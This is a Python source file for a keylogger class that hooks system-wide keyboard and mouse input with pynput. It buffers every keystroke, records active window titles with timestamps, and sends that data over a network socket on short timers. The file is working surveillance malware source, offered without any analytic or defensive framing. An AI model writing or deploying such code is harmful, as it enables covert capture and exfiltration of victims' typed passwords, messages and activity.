import threading

from pynput.keyboard import Key, Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import pygetwindow as gw
from datetime import datetime


class KeyLog:
    def __init__(self,socket,sep,name):
        keyboard_listener = KeyboardListener(on_press=self.on_key_press)
        keyboard_listener.start()
        mouse_listener = MouseListener(on_click=self.on_mouse_click)
        mouse_listener.start()

        self.s = socket
        self.name = name
        self.SEPERATOR = sep
        self.buffer = ""
        self.buffer_key = ""
        self.timer = None
        self.timer1 = None
        self.current_app = ""

    def format_key(self, key):
        key_mapping = {
            Key.alt_l: 'Alt',
            Key.alt_r: 'Alt',
            Key.tab: 'Tab',
            Key.ctrl_l: 'Ctrl',
            Key.ctrl_r: 'Ctrl',
            Key.shift_l: 'Shift',
            Key.shift_r: 'Shift',
            Key.enter: 'Enter',
            Key.space: 'Space',
            Key.esc: 'Escape',  # Example for Escape key
            Key.backspace: 'Backspace',
            Key.cmd: 'Win'
        }

        if isinstance(key, Key):
            return key_mapping.get(key, str(key))
        else:
            return str(key).replace("'", "")

    def on_key_press(self,key):
        with open('log.txt', "a") as file:
            try:
                text = self.format_key(key)

                if len(text) > 1:
                    if self.buffer_key:
                        last_word = self.buffer_key.split()[-1]
                        if last_word == 'Win':
                            if text != 'Win':
                                self.buffer_key += text + " "
                        else:
                            self.buffer_key += text + " "
                    else:
                      self.buffer_key +=  text + " "
                else:
                    self.buffer += text
                if self.timer:
                    self.timer.cancel()
                if self.timer1:
                    self.timer1.cancel()

                self.timer = threading.Timer(5.0, self.send_buffer)
                self.timer.start()

                self.timer1 = threading.Timer(1, self.send_buffer_key)
                self.timer1.start()
            except Exception as e:
                print(f"Error logging key: {e}")

    def on_mouse_click(self, x, y, button, pressed):
        if pressed:
            active_window = gw.getActiveWindow()
            if active_window:
                print(f'mouse click {active_window.title}')
                if active_window.title != self.current_app:
                    self.current_app = active_window.title
                    now = datetime.now()
                    formatted_time = now.strftime("%H:%M %d/%m/%Y")
                    message = f"{self.name}{self.SEPERATOR}{self.current_app} {formatted_time}"
                    self.s.send(message.encode())

    def send_buffer(self):
        message = f"{self.name}{self.SEPERATOR}{self.buffer}"
        # print(f'send {message}')
        self.buffer = ""
        self.s.send(message.encode())

    def send_buffer_key(self):
        message = f"{self.name}{self.SEPERATOR}{self.buffer_key}"
        print(f'send {message}')
        self.buffer_key = ""
        self.s.send(message.encode())






